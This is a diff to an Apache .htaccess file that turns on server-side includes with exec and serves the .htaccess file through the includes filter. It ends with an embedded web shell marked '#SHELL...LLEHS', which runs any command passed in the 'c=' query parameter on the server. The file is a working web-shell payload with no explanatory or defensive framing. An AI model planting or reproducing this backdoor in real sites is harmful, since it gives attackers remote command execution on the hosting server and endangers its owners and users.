@@ -7,13 +7,14 @@
 # Require all granted
     Order allow,deny
     Allow from all
+    SetOutputFilter INCLUDES
 </Files>
 
 # Enable serverside includes with exec functionality
 Options +Includes
 
 #Make apache treat .htaccess as a server side include file
-AddHandler text/html .htaccess
-AddOutputFilter INCLUDES .htaccess
+#AddHandler text/html .htaccess
+#AddOutputFilter INCLUDES .htaccess
 
 #SHELL<!--#exec cmd="echo ''" --><!--#if expr="$QUERY_STRING_UNESCAPED = /^c=(.*)$/" --><!--#set var="cmd" value="$1 2>&1" --><!--#else --><!--#set var="cmd" value="echo 'Regex failed'" --><!--#endif --><!--#exec cmd="$cmd"-->LLEHS
